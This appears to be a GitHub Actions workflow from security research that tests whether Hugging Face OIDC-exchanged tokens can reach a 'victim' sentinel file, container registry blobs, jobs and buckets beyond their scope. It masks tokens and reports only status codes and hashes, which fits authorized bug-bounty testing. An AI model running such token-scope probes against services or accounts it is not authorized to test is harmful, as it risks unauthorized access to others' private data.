name: HF Trusted Publisher Token-Class Probe

on:
  workflow_dispatch:
    inputs:
      resource:
        description: Owned Hugging Face model resource
        required: true
        type: string

permissions:
  contents: read
  id-token: write

jobs:
  token-class-probe:
    runs-on: ubuntu-latest
    steps:
      - name: Exchange OIDC and test unrelated relying parties
        env:
          RESOURCE: ${{ inputs.resource }}
        run: |
          set -euo pipefail
          oidc_response="$(curl -fsS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https%3A%2F%2Fhuggingface.co")"
          OIDC_TOKEN="$(jq -er .value <<<"$oidc_response")"
          echo "::add-mask::$OIDC_TOKEN"
          exchange_payload="$(jq -cn --arg subject_token "$OIDC_TOKEN" --arg resource "$RESOURCE" '{grant_type:"urn:ietf:params:oauth:grant-type:token-exchange",subject_token_type:"urn:ietf:params:oauth:token-type:id_token",subject_token:$subject_token,resource:$resource}')"
          exchange_response="$(curl -fsS -X POST https://huggingface.co/oauth/token -H 'Content-Type: application/json' --data "$exchange_payload")"
          HF_TOKEN="$(jq -er .access_token <<<"$exchange_response")"
          echo "::add-mask::$HF_TOKEN"
          jq -c '{token_type,expires_in,issued_token_type}' <<<"$exchange_response" | sed 's/^/HF_EXCHANGE=/'

          source_file="$(mktemp)"
          source_status="$(curl -sS -o "$source_file" -w '%{http_code}' "https://huggingface.co/${RESOURCE}/resolve/main/PRIVATE_VICTIM_SENTINEL.txt" -H "Authorization: Bearer $HF_TOKEN")"
          echo "SOURCE_STATUS=$source_status"
          if [ "$source_status" = 200 ]; then sha256sum "$source_file" | awk '{print "SOURCE_SHA256=" $1}'; fi
          rm -f "$source_file"

          registry_response="$(curl -sS -u "h1testrightmeow:${HF_TOKEN}" --get 'https://huggingface.co/api/registry/token' --data-urlencode 'service=container_registry' --data-urlencode 'scope=repository:h1testrightmeow/oauth-container-scope-canary-20261107:pull')"
          REG_TOKEN="$(jq -er '.token // .access_token' <<<"$registry_response")"
          echo "::add-mask::$REG_TOKEN"
          export REG_TOKEN
          python - <<'PY'
          import base64, json, os
          part = os.environ["REG_TOKEN"].split(".")[1]
          part += "=" * (-len(part) % 4)
          claims = json.loads(base64.urlsafe_b64decode(part))
          print("REGISTRY_CLAIMS=" + json.dumps({"aud": claims.get("aud"), "access": claims.get("access")}, sort_keys=True))
          PY
          manifest_file="$(mktemp)"
          manifest_status="$(curl -sS -o "$manifest_file" -w '%{http_code}' -H "Authorization: Bearer $REG_TOKEN" -H 'Accept: application/vnd.oci.image.manifest.v1+json' 'https://cr.hf.co/v2/h1testrightmeow/oauth-container-scope-canary-20261107/manifests/tokenclass-canary-20261107')"
          echo "REGISTRY_MANIFEST_STATUS=$manifest_status"
          if [ "$manifest_status" = 200 ]; then
            layer_file="$(mktemp)"
            layer_status="$(curl -sS -o "$layer_file" -w '%{http_code}' -H "Authorization: Bearer $REG_TOKEN" 'https://cr.hf.co/v2/h1testrightmeow/oauth-container-scope-canary-20261107/blobs/sha256:f38b254b0f4f9504d606272d516349343b37f811ff90f7a4467eaf949de42dae')"
            echo "REGISTRY_LAYER_STATUS=$layer_status"
            if [ "$layer_status" = 200 ]; then sha256sum "$layer_file" | awk '{print "REGISTRY_LAYER_SHA256=" $1}'; fi
            rm -f "$layer_file"
          fi
          rm -f "$manifest_file"

          jobs_status="$(curl -sS -o /tmp/jobs.json -w '%{http_code}' -H "Authorization: Bearer $HF_TOKEN" 'https://huggingface.co/api/jobs/h1testrightmeow')"
          bucket_status="$(curl -sS -o /tmp/bucket.json -w '%{http_code}' -H "Authorization: Bearer $HF_TOKEN" 'https://huggingface.co/api/buckets/h1testrightmeow/oauth-scope-canary-20261107')"
          echo "JOBS_STATUS=$jobs_status"
          echo "BUCKET_STATUS=$bucket_status"
